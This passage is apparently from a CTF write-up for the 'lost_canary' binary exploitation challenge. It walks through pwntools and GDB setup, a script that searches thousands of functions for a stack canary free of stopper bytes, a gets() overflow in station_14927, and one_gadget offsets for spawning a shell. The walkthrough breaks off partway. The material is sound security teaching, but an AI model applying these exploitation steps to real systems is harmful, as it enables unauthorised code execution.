</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">break printf
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span></code></pre></div><p>Furthermore, we want to add the following line to the script, to split our tmux session horizontally with GDB on the right and our exploit on the left (the default is a vertical split with the exploit on the top and GDB on the bottom half)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;splitw&#34;</span>, <span style="color:#e6db74">&#34;-h&#34;</span>]
</span></span></code></pre></div><p>Alternatively, we can make the setting permanently in one of the possible config files, for example in <code>~/.config/pwn.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#66d9ef">[context]</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">terminal</span><span style="color:#f92672">=</span><span style="color:#e6db74">[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]</span>
</span></span></code></pre></div><p>If we now start the script locally with GDB, we can compare the location of the libc with the leaked one from our script. To do that, we first start the script in tmux with <code>python lost_canary.py GDB LOCAL</code>. Now the script will interact with the challenge and break at <code>printf</code>. Like previously, we have to continue at the first <code>printf</code>. Since we also want to see the output of <code>printf</code> to get a proper leak, we <code>finish</code> the call to <code>printf</code>. Now we have the libc leak logged in our script and can compare it with the real one. To get the libc base address, we can use the command <code>vmmap</code> in GDB, which will list us all memory regions, including those for libc. The first entry of libc should be equal with our logged address.</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /tmp/lost_canary
    0x555555555000     0x555555931000 r-xp   3dc000   1000 /tmp/lost_canary
    0x555555931000     0x555555c12000 r--p   2e1000 3dd000 /tmp/lost_canary
    0x555555c12000     0x555555c13000 r--p     1000 6bd000 /tmp/lost_canary
    0x555555c13000     0x555555c54000 rw-p    41000 6be000 /tmp/lost_canary
    0x555555efe000     0x555555f01000 rw-p     3000 9aa000 /tmp/lost_canary
    0x7ffff7dd3000     0x7ffff7dd5000 rw-p     2000      0 [anon_7ffff7dd3]
    0x7ffff7dd5000     0x7ffff7df7000 r--p    22000      0 /tmp/libc-2.31.so
    0x7ffff7df7000     0x7ffff7f6f000 r-xp   178000  22000 /tmp/libc-2.31.so
    0x7ffff7f6f000     0x7ffff7fbd000 r--p    4e000 19a000 /tmp/libc-2.31.so
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000 1e7000 /tmp/libc-2.31.so
    0x7ffff7fc1000     0x7ffff7fc3000 rw-p     2000 1eb000 /tmp/libc-2.31.so
    0x7ffff7fc3000     0x7ffff7fc9000 rw-p     6000      0 [anon_7ffff7fc3]
    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]
    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]
    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /tmp/ld-2.31.so
    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /tmp/ld-2.31.so
    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /tmp/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /tmp/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /tmp/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
</code></pre><h2 id="getting-a-stack-buffer-overflow">Getting a stack buffer overflow<a href="#getting-a-stack-buffer-overflow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>As next step we need a working stack buffer overflow to overwrite the return address of one of the <code>station_xxx</code> functions with our ROP chain. So let&rsquo;s take a closer look at the four functions involved in our different buffer overflows:</p>
<ul>
<li><code>fgets</code>: Stops at a newline</li>
<li><code>gets</code>: Stops at a newline</li>
<li><code>scanf</code> with <code>%s</code>: Stops at a whitespace</li>
<li><code>strcpy</code>: Stops at a null byte</li>
</ul>
<p>In order to pass the canary, we have to overwrite it with the same value. Since the canaries are constant values from the application, we know the value. The problem is, most of the canaries contain at least one character that will trigger the stop of one of the input functions. As a result, we have to find a function with a canary that does not have a stopper.</p>
<p>Our first naive approach was to just execute the function with pwntools <code>process</code>, overwrite the return address with an invalid value and search for an instance that crashes. This would work, since if the canary would contain a stopper character, the additional input characters would be ignored and the application would just exit normally. Unfortunately, this does not work, since we were unable to get the return code of the process. The next best alternative would be to execute the process in a shell chained with an echo to register a successful termination (<code>lost_canary &amp;&amp; echo FINE</code>). After some testing, we ditched this approach, because it was quite slow.</p>
<p>As an alternative, we decided to disassemble the station functions, match the disassembly with the relevant functions that may stop our overwrite attempt and check their constraints with the corresponding canary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># for a nice progress bar</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tqdm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># find a suitable station for overwriting the complete canary</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_station</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pwndbg skips the endbr64, which is 4 bytes</span>
</span></span><span style="display:flex;"><span>    scanf <span style="color:#f92672">=</span>  <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;call</span><span style="color:#e6db74">{</span>exe<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__isoc99_scanf&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    strcpy <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;call</span><span style="color:#e6db74">{</span>exe<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;strcpy&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    fgets <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;call</span><span style="color:#e6db74">{</span>exe<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;fgets&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    gets <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;call</span><span style="color:#e6db74">{</span>exe<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;gets&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># iterate over all station functions and their canaries</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm<span style="color:#f92672">.</span>tqdm(range(<span style="color:#ae81ff">31768</span>)):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># disassemble the function and replace spaces to be sure to match</span>
</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>disasm(exe<span style="color:#f92672">.</span>functions[<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;station_</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">.</span>address, exe<span style="color:#f92672">.</span>functions[<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;station_</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">.</span>size)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># get the canary</span>
</span></span><span style="display:flex;"><span>        guard <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>read(exe<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;__stack_chk_guard_</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>], <span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># continue with next station if a stopper was found</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> gets <span style="color:#f92672">in</span> code <span style="color:#f92672">or</span> fgets <span style="color:#f92672">in</span> code:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> guard:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> scanf <span style="color:#f92672">in</span> code:
</span></span><span style="display:flex;"><span>            found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> w <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>whitespace<span style="color:#f92672">.</span>encode():
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> w <span style="color:#f92672">in</span> guard:
</span></span><span style="display:flex;"><span>                    found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> found:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> strcpy <span style="color:#f92672">in</span> code:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> guard:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># if we haven&#39;t returned until here, we have found a suitable station</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> i
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># notify us, if we haven&#39;t found a matching station</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>failure(<span style="color:#e6db74">&#34;didn&#39;t found a match&#34;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>station <span style="color:#f92672">=</span> get_station()
</span></span></code></pre></div><p>When a library function is called, the code calls a little snippet that gets the address of that function from the GOT and calls the function. The collection of these snippets is called Procedure Linkage Table (PLT).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">**************************************************************</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">*</span>                       <span style="color:#a6e22e">THUNK</span> <span style="color:#66d9ef">FUNCTION</span>                       *
</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">**************************************************************</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">thunk</span> <span style="color:#66d9ef">char</span> * <span style="color:#66d9ef">gets</span>(<span style="color:#66d9ef">char</span> * <span style="color:#66d9ef">__s</span>)
</span></span><span style="display:flex;"><span>                        Thunked-Function: <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">EXTERNAL</span><span style="color:#960050;background-color:#1e0010">&gt;</span>::<span style="color:#66d9ef">gets</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">char</span> *            <span style="color:#66d9ef">RAX</span>:<span style="color:#ae81ff">8</span>          <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#66d9ef">RETURN</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">char</span> *            <span style="color:#66d9ef">RDI</span>:<span style="color:#ae81ff">8</span>          <span style="color:#66d9ef">__s</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">EXTERNAL</span><span style="color:#960050;background-color:#1e0010">&gt;</span>::<span style="color:#66d9ef">gets</span>                                <span style="color:#66d9ef">XREF</span>[<span style="color:#ae81ff">11024</span>]  <span style="color:#66d9ef">station_2</span>:<span style="color:#ae81ff">001013</span><span style="color:#66d9ef">f5</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_4:<span style="color:#960050;background-color:#1e0010">001014</span><span style="color:#a6e22e">da</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_6:<span style="color:#960050;background-color:#1e0010">001015</span><span style="color:#a6e22e">bf</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_10:<span style="color:#960050;background-color:#1e0010">00101741(</span><span style="color:#a6e22e">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_11:<span style="color:#960050;background-color:#1e0010">001017</span><span style="color:#a6e22e">a0</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_12:<span style="color:#960050;background-color:#1e0010">001017</span><span style="color:#a6e22e">ff</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_15:<span style="color:#960050;background-color:#1e0010">00101920(</span><span style="color:#a6e22e">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_17:<span style="color:#960050;background-color:#1e0010">001019</span><span style="color:#a6e22e">e0</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_18:<span style="color:#960050;background-color:#1e0010">00101</span><span style="color:#a6e22e">a3f</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_25:<span style="color:#960050;background-color:#1e0010">00101</span><span style="color:#a6e22e">d2e</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_28:<span style="color:#960050;background-color:#1e0010">00101</span><span style="color:#a6e22e">e74</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_34:<span style="color:#960050;background-color:#1e0010">00102127(</span><span style="color:#a6e22e">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_35:<span style="color:#960050;background-color:#1e0010">00102186(</span><span style="color:#a6e22e">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_40:<span style="color:#960050;background-color:#1e0010">001023</span><span style="color:#a6e22e">d8</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_43:<span style="color:#960050;background-color:#1e0010">0010251</span><span style="color:#a6e22e">e</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_44:<span style="color:#960050;background-color:#1e0010">0010257</span><span style="color:#a6e22e">d</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_46:<span style="color:#960050;background-color:#1e0010">0010263</span><span style="color:#a6e22e">d</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_50:<span style="color:#960050;background-color:#1e0010">001027</span><span style="color:#a6e22e">e4</span>(<span style="color:#66d9ef">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_51:<span style="color:#960050;background-color:#1e0010">00102843(</span><span style="color:#a6e22e">c</span>),
</span></span><span style="display:flex;"><span>                                                                                    station_52:<span style="color:#960050;background-color:#1e0010">001028</span><span style="color:#a6e22e">a2</span>(<span style="color:#66d9ef">c</span>), [<span style="color:#66d9ef">more</span>]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">00101180</span> <span style="color:#a6e22e">f3</span> <span style="color:#ae81ff">0</span><span style="color:#66d9ef">f</span> <span style="color:#ae81ff">1</span><span style="color:#66d9ef">e</span> <span style="color:#66d9ef">fa</span>     <span style="color:#66d9ef">ENDBR64</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">00101184</span> <span style="color:#a6e22e">f2</span> <span style="color:#66d9ef">ff</span> <span style="color:#ae81ff">25</span>        <span style="color:#66d9ef">JMP</span>        <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [-<span style="color:#960050;background-color:#1e0010">&gt;&lt;</span><span style="color:#66d9ef">EXTERNAL</span><span style="color:#960050;background-color:#1e0010">&gt;</span>::<span style="color:#66d9ef">gets</span>]                                 <span style="color:#66d9ef">char</span> * <span style="color:#66d9ef">gets</span>(<span style="color:#66d9ef">char</span> * <span style="color:#66d9ef">__s</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#a6e22e">d</span> <span style="color:#66d9ef">de</span> <span style="color:#ae81ff">6</span><span style="color:#66d9ef">b</span> <span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">--</span> <span style="color:#a6e22e">Flow</span> <span style="color:#66d9ef">Override</span>: <span style="color:#66d9ef">CALL_RETURN</span> (<span style="color:#66d9ef">COMPUTED_CALL_TERMINATOR</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0010118</span><span style="color:#a6e22e">b</span> <span style="color:#ae81ff">0</span><span style="color:#66d9ef">f</span>              <span style="color:#960050;background-color:#1e0010">??</span>         <span style="color:#ae81ff">0</span><span style="color:#66d9ef">Fh</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0010118</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">1</span><span style="color:#66d9ef">f</span>              <span style="color:#960050;background-color:#1e0010">??</span>         <span style="color:#ae81ff">1</span><span style="color:#66d9ef">Fh</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0010118</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">44</span>              <span style="color:#960050;background-color:#1e0010">??</span>         <span style="color:#ae81ff">44</span><span style="color:#66d9ef">h</span>    <span style="color:#66d9ef">D</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0010118</span><span style="color:#a6e22e">e</span> <span style="color:#ae81ff">00</span>              <span style="color:#960050;background-color:#1e0010">??</span>         <span style="color:#ae81ff">00</span><span style="color:#66d9ef">h</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0010118</span><span style="color:#a6e22e">f</span> <span style="color:#ae81ff">00</span>              <span style="color:#960050;background-color:#1e0010">??</span>         <span style="color:#ae81ff">00</span><span style="color:#66d9ef">h</span>
</span></span></code></pre></div><p>As previously, pwntools offers us simple functions to get the address and the size of functions, an easy to use disassembler and a function to read the canaries. Please be aware, that pwntools will create a folder in <code>/tmp</code> to execute the disassembling of a function. Since we call the disassembler quite often, this will spam your <code>/tmp</code> until the script may clean it up during exit.</p>
<p>After some time (about half an hour on my 12 year old laptop), we get the result: The canary of <code>station_14927</code> does not contain a character that will stop the input function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">station_14927</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_14 [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  ulong local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> s_FovQMN_ZCz_JakRleBnJLdMI_SD_pYOZ_007dc257._49_8_;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#e6db74">&#34;Welcome to station 14927.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enter ticket code:&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(local_14);
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> local_10 <span style="color:#f92672">^</span> s_FovQMN_ZCz_JakRleBnJLdMI_SD_pYOZ_007dc257._49_8_;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function features a call to <code>gets</code>. If we want to see the canary, we can switch to the constant and clear the code bytes. Now, our symbol is properly displayed and we can read the canary: <code>eY iEuas</code>.</p>
<h2 id="get-a-shell">Get a shell<a href="#get-a-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>With that out of the way, we can build our ROP chain. As explained earlíer, we have two possibilities:</p>
<ol>
<li>A one gadget or</li>
<li>a rop chain to call <code>system(&quot;/bin/sh&quot;)</code>.</li>
</ol>
<h3 id="one-gadget">one gadget<a href="#one-gadget" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Before we start the process of finding a suitable one gadget, let&rsquo;s first ensure, that we execute the binary with the correct libc, as different versions of libc populate registers with different values in lots of functions. If we use our generated exploit script, pwntools will handle that for us. Otherwise, we can use <code>patchtelf</code> to set the interpreter and library path such that the application loads the provided loader and libc. We have to also set the loader, since it is coupled with the libc and having a version mismatch will likely cause a crash on startup.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ patchelf --set-interpreter /tmp/ld-2.31.so --add-rpath . --output lost_canary_local lost_canary
</span></span></code></pre></div><p>As the binary will search for a <code>libc.so.6</code> in the library path, we also have to rename the provided libc or create a symlink:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ln -s libc-2.31.so libc.so.6
</span></span></code></pre></div><p>Since one gadgets must fullfill certain conditions, lets break at the start of <code>station_14927</code> and step with <code>ni</code> (for next instruction) until we reach the return. Or we can again use <code>finish</code>, but this also executes the return. As a quality of live feature, GDB automatically executes the last command, if we just hit enter. With the <code>context</code> command, which is automatically executed every time we break, i.e. after each <code>ni</code>, we can get a good overview of the current state.</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; finish
Run till exit from #0  0x00005555556e01fe in station_14927 ()
AWelcome to station 14927.
Enter ticket code:
0x00005555558ef4dc in select_station ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────
*RAX  0x7361754569205965 (&#39;eY iEuas&#39;)
 RBX  0x555555930a90 (__libc_csu_init) ◂— endbr64
*RCX  0x7ffff7fc1980 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RDX  0x0
*RDI  0x7ffff7fc37f0 ◂— 0x0
*RSI  0x7ffff7fc1a03 (_IO_2_1_stdin_+131) ◂— 0xfc37f0000000000a /* &#39;\n&#39; */
*R8   0x7fffffffe1b4 ◂— 0x41 /* &#39;A&#39; */
 R9   0x0
*R10  0x555555931033 ◂— 0x6c65570000000000
*R11  0x246
 R12  0x5555555551c0 (_start) ◂— endbr64
 R13  0x7fffffffe2f0 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x7fffffffe1f0 —▸ 0x7fffffffe200 ◂— 0x0
*RSP  0x7fffffffe1d0 ◂— &#39;14927 %13$p\n&#39;
*RIP  0x5555558ef4dc (select_station+224098) ◂— jmp 555555930a2ch
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
 ► 0x5555558ef4dc &lt;select_station+224098&gt;    jmp    555555930a2ch                 &lt;select_station+491698&gt;
    ↓
   0x555555930a2c &lt;select_station+491698&gt;    nop
   0x555555930a2d &lt;select_station+491699&gt;    leave
   0x555555930a2e &lt;select_station+491700&gt;    ret
    ↓
   0x555555930a84 &lt;main+85&gt;                  mov    eax, 0
   0x555555930a89 &lt;main+90&gt;                  pop    rbp
   0x555555930a8a &lt;main+91&gt;                  ret
    ↓
   0x7ffff7df9083 &lt;__libc_start_main+243&gt;    mov    edi, eax
   0x7ffff7df9085 &lt;__libc_start_main+245&gt;    call   7ffff7e1ba40h                 &lt;exit&gt;

   0x7ffff7df908a &lt;__libc_start_main+250&gt;    mov    rax, qword ptr [rsp + 8]
   0x7ffff7df908f &lt;__libc_start_main+255&gt;    lea    rdi, [rip + 18fdd2h]
─────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe1d0 ◂— &#39;14927 %13$p\n&#39;
01:0008│-018 0x7fffffffe1d8 ◂— 0xa702433 /* &#39;3$p\n&#39; */
02:0010│-010 0x7fffffffe1e0 —▸ 0x555555555100 (printf@plt) ◂— endbr64
03:0018│-008 0x7fffffffe1e8 ◂— 0x3a4fffffe2f0
04:0020│ rbp 0x7fffffffe1f0 —▸ 0x7fffffffe200 ◂— 0x0
05:0028│+008 0x7fffffffe1f8 —▸ 0x555555930a84 (main+85) ◂— mov eax, 0
06:0030│+010 0x7fffffffe200 ◂— 0x0
07:0038│+018 0x7fffffffe208 —▸ 0x7ffff7df9083 (__libc_start_main+243) ◂— mov edi, eax
───────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0   0x5555558ef4dc select_station+224098
   1   0x555555930a84 main+85
   2   0x7ffff7df9083 __libc_start_main+243
   3   0x5555555551ee _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>Now we only need a list of one gadgets to find a suitable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ one_gadget libc-2.31.so
</span></span><span style="display:flex;"><span>0xe3afe execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, r15, r12<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>r15<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r15 <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r15 is a valid argv
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>r12<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r12 <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r12 is a valid envp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0xe3b01 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, r15, rdx<span style="color:#f92672">)</span>
